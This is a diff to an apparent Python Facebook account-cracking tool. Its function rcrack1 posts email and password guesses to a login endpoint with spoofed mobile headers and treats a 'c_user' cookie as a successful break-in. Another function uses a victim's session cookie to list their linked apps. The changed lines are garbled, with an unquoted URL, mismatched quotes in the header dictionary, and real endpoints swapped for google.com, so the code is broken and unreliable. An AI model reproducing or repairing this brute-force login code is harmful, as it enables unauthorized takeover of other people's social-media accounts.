@@ -242,7 +242,7 @@ logo=(f"""
 \033[1;32m  •   \033[1;33mCREATED BY\33[0;m   :  \033[1;32mAMIR
 \033[1;32m  •   \033[1;32mFACEBOK      : \033[1;3m MALIKAMIR
 \033[1;32m  •   \033[1;35mGITHUB       :  \033[1;35mMALIK AMIR
-\033[1;32m  •   \033[1;36mTOOL VIRSION :  \033[1;36m0.8
+\033[1;32m  •   \033[1;36mTOOL VIRSION :  \033[1;36m0.10
 \033[1;37m══════════════════════════════════════════\n""")
 os.system ('clear')
 
@@ -267,7 +267,7 @@ def cek_apk(coki):
             print(f"\r %s[%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
         #else:
             #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    w=session.get(https://www.google.com/,cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
@@ -515,24 +515,27 @@ def rcrack1(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {
-    'authority': 'm.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'accept-language': 'en-ZA,en-GB;q=0.9,en-AU;q=0.8,en-US;q=0.7,en;q=0.6',
-    'cache-control': 'max-age=0',    
-    'referer': 'https://m.facebook.com/?stype=lo&jlou=AfeT0Sx_BbbZWRbGLG5VaseYRYnp1RihasAmMEJwfSLIG7nK7kHuTyKp7dPagCuUN7RHaqZLr4uvbI6-RIa9104BFvLhoqmZg6Rl18sdwR27Fw&smuh=6614&lh=Ac-KScdEG1qEMSWKgh8&_rdr',
-    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
-}
+			header_freefb = 
+			
+           {"authority":'web.facebook.com',
+             "method": 'GET',
+             "path":'/login.php?skip_api_login=1&api_key=554681589018843&kid_directed_site=0&app_id=554681589018843&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fscope%3Demail%26state%3Dinc1y379fzddVl6PGmloUI5G2pD2Wufp%26redirect_uri%3Dhttps%253A%252F%252Fwww.cmo.com.au%252Fsocial%252Fcomplete%252Ffacebook%252F%26client_id%3D554681589018843%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D147ba1cd-158b-432f-8e5a-ec5792f496e8%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.cmo.com.au%2Fsocial%2Fcomplete%2Ffacebook%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dinc1y379fzddVl6PGmloUI5G2pD2Wufp%23_%3D_&display=page&locale=en_GB&pl_dbl=0&_rdc=1&_rdr',
+             "scheme': "https',
+              'accept":'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;',
+              "accept-encoding":,"gzip,deflate,br',
+              "accept-language":'en-IE,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+             "cache-control":'max-age=0',
+             "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24",
+            "sec-ch-ua-mobile":'?1',
+            "sec-ch-ua-platform": '"Android"',
+           "sec-fetch-dest":'document',
+          "sec-fetch-mode":'navigate',
+         "sec-fetch-site":'cross-site',
+          "sec-fetch-user":'?1',
+         "upgrade-insecure-requests":'1',
+           "user-agent": 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
 
-			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			lo = session.post('https://www.google.com/_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
